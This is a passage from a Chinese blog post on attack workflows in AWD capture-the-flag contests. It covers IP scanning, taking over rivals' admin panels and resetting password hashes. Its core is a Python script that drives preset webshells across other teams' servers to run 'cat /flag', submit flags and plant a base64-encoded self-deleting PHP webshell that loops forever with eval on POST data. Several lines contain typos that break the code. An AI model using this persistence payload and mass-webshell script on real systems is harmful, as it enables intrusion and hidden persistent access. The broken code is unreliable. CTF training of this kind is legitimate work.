@@ -1,0 +1,760 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/blog.jpg">
+  <link rel="icon" href="/img/blog.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AWD攻击流程攻击步骤：1.管理后台1.知彼知己，首先拿到服务器之后搞清楚自己防守机IP，搞清楚其他队伍的IP。 IP划分一般存在三种情况 分配C段地址，分配B段地址和分配端口 假如有50只队伍,一般会类似于这样的	 C段192.168.1.1–50 同理是B端地址就会类似于这样    B段：192.168.1–50.1 如果是分配端口的则需要在IP后面加上端号，如端口号为8801 “192.16">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD攻击流程">
+<meta property="og:url" content="http://example.com/2022/03/19/AWD%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B/index.html">
+<meta property="og:site_name" content="TTblog">
+<meta property="og:description" content="AWD攻击流程攻击步骤：1.管理后台1.知彼知己，首先拿到服务器之后搞清楚自己防守机IP，搞清楚其他队伍的IP。 IP划分一般存在三种情况 分配C段地址，分配B段地址和分配端口 假如有50只队伍,一般会类似于这样的	 C段192.168.1.1–50 同理是B端地址就会类似于这样    B段：192.168.1–50.1 如果是分配端口的则需要在IP后面加上端号，如端口号为8801 “192.16">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161001272.png">
+<meta property="og:image" content="c:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20230416095907780.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161510261.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161539823.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161546059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161547523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304192001941.png">
+<meta property="article:published_time" content="2022-03-19T03:22:34.000Z">
+<meta property="article:modified_time" content="2023-04-19T14:12:00.348Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="攻击步骤">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161001272.png">
+  
+  
+  
+  <title>AWD攻击流程 - TTblog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>不会做题的菜鸡</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>主页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>文章</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>类别</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="AWD攻击流程"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-19 11:22" pubdate>
+          March 19, 2022 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          74 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">AWD攻击流程</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="AWD攻击流程"><a href="#AWD攻击流程" class="headerlink" title="AWD攻击流程"></a>AWD攻击流程</h1><h2 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a>攻击步骤：</h2><h2 id="1-管理后台"><a href="#1-管理后台" class="headerlink" title="1.管理后台"></a>1.管理后台</h2><p>1.知彼知己，首先拿到服务器之后搞清楚自己防守机IP，搞清楚其他队伍的IP。</p>
+<p>IP划分一般存在三种情况</p>
+<p>分配C段地址，分配B段地址和分配端口</p>
+<p>假如有50只队伍,一般会类似于这样的	 C段192.168.1.<strong>1–50</strong></p>
+<p>同理是B端地址就会类似于这样    B段：192.168.<strong>1–50</strong>.1</p>
+<p>如果是分配端口的则需要在IP后面加上端号，如端口号为8801</p>
+<p>“192.168.1.1:8801” 这样才能访问。</p>
+<p> 常用IP地址我们分为三类</p>
+<p> A类 从1.0.0.0 到126.255.255.255<br> B类 从128.0.0.0到191.255.255.255<br> C类 从192.0.0.0到223.255.255.255</p>
+<p>其中127.x.x.x段地址空间是被保留的回环地址</p>
+<p>如何搞清楚其他队伍的IP呢？</p>
+<h3 id="首先进行扫描："><a href="#首先进行扫描：" class="headerlink" title="首先进行扫描："></a>首先进行扫描：</h3><p>利用脚本扫描B段，C段网络，端口</p>
+<p>1.探测后台 常见的后台地址一般为admin，admin.php，admin.html , login.php，并且大概率是弱口令，或可以用万能密码登录的漏洞，即使存在验证码也有绕过的可能，除了手动测试，burp爆破外还可以用web_pwd_common_crack，对网站进行弱口令进行快速识别，（工具运行环境python2）</p>
+<h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h3><p>全场的后台口令默认值是相同的 ，又是相同源码搭建的网站，在进入后台后第一时间把自己后台密码修改掉，并告知攻击手。</p>
+<h3 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h3><p>攻击手用脚本快速打开其他队伍网站的后台界面，修改掉其他队伍的后台登陆密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> webbrowser <span class="hljs-comment">#导入了webborwser模块</span><br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url_admin.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>file_list=flie.readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file_list:<br>    <span class="hljs-keyword">try</span>:<br>        webborwser.<span class="hljs-built_in">open</span>(i.strip())<span class="hljs-comment">#webbrowser.open()函数打开了每个URL trip()函数用于删除URL中的空格和换行符。</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>        <br></code></pre></td></tr></table></figure>
+
+
+
+<p>如若自己后台密码已经被对手快速改掉了，就要通过数据库修改自己防守的管理员密码</p>
+<p>首先要找到连接数据库的用户和密码，该信息一般存在于源码的某个配置文件中，一般名字为config.php config.ini db.ini 等，如果，没有找到该文件可以通过notepad++将mysql连接端口作为关键字搜索。</p>
+<p>例如下图</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161001272.png" srcset="/img/loading.gif" lazyload alt="image-20230416100107076"></p>
+<p>进入到config.inc.php ,可得到连接数据库的用户名和密码</p>
+<p><img src="C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20230416095907780.png" srcset="/img/loading.gif" lazyload alt="image-20230416095907780"></p>
+<p> 终端输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql   -uadmin  -p123456<br></code></pre></td></tr></table></figure>
+
+<p>进入数据库后修改管理后台登录的密码，一般情况下密码会以哈希加密的形式被存储，所以替换的时候要进行同样的加密，所以需要在源码中找到加密算法，一般在function.php中,以pikachu为例如图所示：</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161510261.png" srcset="/img/loading.gif" lazyload alt="image-20230416151047170"></p>
+<p>接下来咱们进行，简单分析以下如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">password_create</span>(<span class="hljs-params"><span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;		<br>	<span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(pass);<br>	<span class="hljs-variable">$get_rand</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>),<span class="hljs-number">2</span>);<br>	<span class="hljs-variable">$newpass</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$get_rand</span>).<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$get_rand</span>;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$newpass</span>;<br>	&#125;<br>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>以admin为例admin的md5为例：21232f297a57a5a743894a0e4a801fc3，随机取出两个连续的字母跟pass拼接，最后$newpass的值为：</p>
+<p>接下来只需要将newpass的值换掉即可</p>
+<p>767bb352046d8df71041d1083c34b04b:7a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">password_create</span>(<span class="hljs-params"><span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;		<br>	<span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(pass);<br>	<span class="hljs-variable">$get_rand</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>),<span class="hljs-number">2</span>);<br>	<span class="hljs-variable">$newpass</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$get_rand</span>).<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$get_rand</span>;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$newpass</span>;<br>	&#125;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$newpass</span> = <span class="hljs-title function_ invoke__">password_create</span>(<span class="hljs-variable">$pass</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$newpass</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161539823.png" srcset="/img/loading.gif" lazyload alt="image-20230416153916770"></p>
+<p>以pikachu为例：</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161546059.png" srcset="/img/loading.gif" lazyload alt="image-20230416154641025"></p>
+<p>初始密码为123456的md5</p>
+<p>将md5值改为654321的MD5</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161547523.png" srcset="/img/loading.gif" lazyload alt="image-20230416154759475"></p>
+<p>输入654321能出现登录成功。</p>
+<h2 id="2-预留后门"><a href="#2-预留后门" class="headerlink" title="2.预留后门"></a>2.预留后门</h2><p>当防御手将源码从服务器打包下载下来，使用D盾安全狗等webshell扫描工具检测后，第一时间清除预留后门，同时告知攻击手后门路径。（一句话木马，有连接密码）</p>
+<h3 id="防御手"><a href="#防御手" class="headerlink" title="防御手"></a>防御手</h3><p>扫描并清除后门</p>
+<p>D盾安全狗等扫描工具无法检测出file_get_content(“&#x2F;flag.php”)等存在危险的代码文件，需要防御手进一步去做代码审计。</p>
+<h3 id="攻击手"><a href="#攻击手" class="headerlink" title="攻击手"></a>攻击手</h3><p>知道了预留的后门位置及连接密码后，攻击手可以结合之前写的IP扫描脚本写一个可以获取其他队伍flag，自动提交flag以及上传不死马的文件文件并激活的脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> re<br>lock=threading.Lock()<br><span class="hljs-built_in">dir</span>=<span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-comment">#修改为不死马的上传路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_post_Flag</span>(<span class="hljs-params">shell_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">type</span>)==<span class="hljs-number">1</span>):<br>            res=requests.get(shell_url,payload,timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res=requests.post(shell_url,payload,timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            flag_pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;flag&#123;(.*?)&#125;&#x27;</span>,re.I)<br>            flag=flag_pattern.findall(<span class="hljs-built_in">str</span>(res.text))[<span class="hljs-number">0</span>]<br>            flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span><br>            result=shell_url+<span class="hljs-string">&quot;connect shell sucess,flag is &quot;</span>+flag<br>            <span class="hljs-built_in">print</span>(result)<br>            flag_text.write(flag+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;shell 404&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;connect shell fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_Flag</span>(<span class="hljs-params">flag_url,data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#headers=&#123;&#x27;Content-Type&#x27;:&#x27;application/json;charset=utf-8&#x27;,</span><br>        <span class="hljs-comment">#&#x27;Authorization&#x27;:&#x27;e2b69d&#x27;</span><br>        <span class="hljs-comment"># &#125;</span><br>        res=requests.post(flag_url,data,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-comment">#res=requests.request(&quot;post&quot;,flag_url,json=data,hraders=headers,timeout=1)</span><br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;submit flag success--&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;submit flag fail&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(flag_url+<span class="hljs-string">&quot;connect fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_get_post</span>():<br>    lock.acquire(<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">global</span> payload<br>    payload=&#123;passwd:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>&#125;<br>    <span class="hljs-comment">#payload=&#123;passwd:&quot;system(&#x27;curl http://flag.host9getflag.php&#x27;);&quot;&#125; #需要修改</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_head:<br>        url_head1=i.strip()+<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/file.php&#x27;</span><br>        shell_url=i.strip()+shell_addr<br>        get_post_Flag(shell_url)<br>        submit_undead_ma(shell_url)<br>        activate_undead_ma(url_head1)<br>    flag_text.close()<br>    first_flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;firstround_flag.txt&#x27;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>    first_flag_list=first_flag_readlines()<br>    flag_server=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+]请输入提交flag的网址 INput example：http://192.168.194.147a;9090/ \n&quot;</span>)<br>    token=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+]请输入自己队伍的token：&quot;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> first_flag_list:<br>        <span class="hljs-keyword">global</span> data<br>        data=&#123;<br>            <span class="hljs-string">&#x27;flag&#x27;</span>:j.strio(),<br>            <span class="hljs-string">&#x27;token&#x27;</span>:token<br>        &#125;<br>        submit_Flag(flag_server,data)<br>    lock.release() <span class="hljs-comment">#释放</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_undead_ma</span>(<span class="hljs-params">shell_url</span>):<br>    ma = <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/file.php&#x27;,base64_decode(&#x27;PD9waHAgDWlnbm9yZV91c2VyX2Fib3J0KHRydWUpOy8v5LiN5q276ams55qE5YWz6ZSu77yM5Y+v5Lul5YaZ6L+b6L+b56iL5LiN6KKr5p2A5q27DXNldF90aW1lX2xpbWl0KDApOy8v6K6+572u5omA5pyJ5pe26Ze06YO96IO95omn6KGMDXVubGluayhfX0ZJTEVfXyk7Ly/pmpDol4/liKDpmaToh6rlt7HvvIzmjqXkuIvmnaXnlKjkuI3mrbvpqazmlofku7blsLHooYzkuoYNJGZpbGUgPSAnLmluZGV4LnBocCc7Ly/mlofku7blkI0NJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTg4YjA5MDliZTQ2ZGYyZTk5MjkxNWExNTZhNGU4NDgiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4nOy8v5ZCO6Zeo5YaF5a6577yM6K6+572ubWQ15a+G56CB6Ziy5q2i5Yir5Lq65Yip55SoDXdoaWxlICgxKXsgIC8vd2hpbGXmrbvlvqrnjq/lhpnlhaXlkI7pl6jvvIENICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsvL+WGmeWQjumXqOWHveaVsA0gICAgdXNsZWVwKDUwMDApOy8v6Ze06ZqU5pe26Ze0DX0NPz4&#x27;));&quot;</span>  <span class="hljs-comment">#需要改绝对路径，与开头的dir的值对应</span><br>    data1=&#123;passwd:ma&#125;<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">type</span>)==<span class="hljs-number">1</span>):<br>            res=requests.get(shell_url,data1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res=requests.post(shell_url,data1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            result=shell_url+<span class="hljs-string">&quot;upload undead_ma success&quot;</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;upload undead_ma fail&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>         <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;connect shell fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">activate_undead_ma</span>(<span class="hljs-params">url_head1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.get(url_head1,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[-]不死马激活失败&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(url_head1+<span class="hljs-string">&quot;[+]不死马激活成功&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;&#x27;前提：需要结合IP扫描.py使用</span><br><span class="hljs-string">    该脚本功能1：利用get或post型一句话木马实现开场第一波flag的获取</span><br><span class="hljs-string">    该脚本功能2：自动提交flag</span><br><span class="hljs-string">    该脚本功能3：通过预留后门上传不死马并触发</span><br><span class="hljs-string">    该脚本功能4：可实现后期的蹭马利用&#x27;&#x27;&#x27;</span>)<br>    file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip_new.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    url_head=file.readlines()<br>    flag_text=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;firstround_flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请输入shell地址 Input example:/shell.php&quot;</span>)<br>    shell_addr=<span class="hljs-built_in">input</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请输入木马的密码Input example：shell&quot;</span>)<br>    <span class="hljs-keyword">global</span> passwd<br>    passwd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]请选择木马类型 1.get 2.post&quot;</span>)<br>    <span class="hljs-keyword">global</span> <span class="hljs-built_in">type</span><br>    <span class="hljs-built_in">type</span>=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    t=threading.Thread(target=prepare_get_post)<br>    t.start()<br></code></pre></td></tr></table></figure>
+
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>如果仅有www-data用户权限，上传路径必须是具有www-data用户权限的文件夹，如果上传的文件夹需要root权限，那么将无法上传。一般upload字样的文件夹都是可以上传的。</p>
